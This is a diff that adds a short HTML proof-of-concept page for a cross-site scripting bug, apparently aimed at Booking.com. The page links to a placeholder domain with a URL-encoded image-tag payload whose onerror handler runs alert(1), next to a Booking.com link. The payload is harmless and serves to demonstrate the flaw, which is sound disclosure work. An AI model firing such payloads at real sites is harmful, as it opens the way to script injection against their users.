@@ -1,1 +1,20 @@
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC for XSS</title>
+</head>
+<body>
+    <h1>Proof of Concept for XSS</h1>
+    <p>Click the link below:</p>
+    <!-- Visit from your domain -->
+    <a href="http://your-domain?%3Cimg%20src%20onerror%3Dalert(1)%3E">
+        <strong>PoC Link</strong>
+    </a>
+    <!-- Link back to Booking.com -->
+    <a href="https://www.booking.com/index.en-gb.html?aid=304142&amp;sid=d9cee73db5f4b5a757c37c5c58f7472a#indexsearch">
+        Booking.com Link
+    </a>
+</body>
+</html>
